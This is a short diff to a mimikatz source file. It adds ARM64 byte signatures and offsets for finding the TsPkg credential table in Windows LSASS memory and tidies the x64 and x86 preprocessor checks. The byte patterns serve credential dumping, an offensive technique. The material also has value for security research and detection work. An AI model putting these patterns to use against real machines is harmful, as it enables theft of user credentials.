@@ -4,13 +4,18 @@
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_tspkg.h"
-#ifdef _M_X64
+#if defined(_M_ARM64)
+BYTE PTRN_WALL_TSGlobalCredTable[] = {0xe1, 0x43, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6, 0xf3, 0x03, 0x00, 0xaa};
+KULL_M_PATCH_GENERIC TsPkgReferences[] = {
+	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WALL_TSGlobalCredTable),	PTRN_WALL_TSGlobalCredTable},	{0, NULL}, {-20, 8, 1}},
+};
+#elif defined(_M_X64)
 BYTE PTRN_WALL_TSGlobalCredTable[]	= {0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d};
 KULL_M_PATCH_GENERIC TsPkgReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_TSGlobalCredTable),	PTRN_WALL_TSGlobalCredTable},	{0, NULL}, {7, 0}},
 	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_TSGlobalCredTable),	PTRN_WALL_TSGlobalCredTable},	{0, NULL}, {7, 1}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WNO8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x51, 0x56, 0xbe};
 BYTE PTRN_WIN8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x53, 0xbb};
 BYTE PTRN_WN81_TSGlobalCredTable[]	= {0x8b, 0xff, 0x57, 0xbf};
